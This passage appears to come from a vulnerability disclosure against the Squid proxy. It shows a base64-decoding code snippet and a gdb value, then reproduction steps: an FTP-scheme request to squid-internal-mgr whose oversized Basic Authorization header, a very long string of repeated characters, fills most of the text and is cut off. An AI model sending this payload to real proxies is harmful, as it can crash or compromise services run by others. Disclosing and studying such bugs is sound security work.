 if (!base64_decode_update(&ctx, &decodedLen, reinterpret_cast<uint8_t*>(decodedAuthToken), strlen(field), field) || !base64_decode_final(&ctx)) 
{ return NULL; } 
decodedAuthToken[decodedLen] = '\0'; 
```
```
(gdb) p decodedLen $21 = 43011
```


 In my repo steps I make an FTP request to squid-internal-mgr. Any user can reach this code since the Manager regex doesn't check for FTP protocol. A user can't access any real actions from cache manager though, just are able to reach the part of the code that will decode the header. 

## Steps To Reproduce:

1) make the following get request 

```
GET ftp://<squid_name>:<squid_port>/squid-internal-mgr/menu HTTP/1.1 

Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ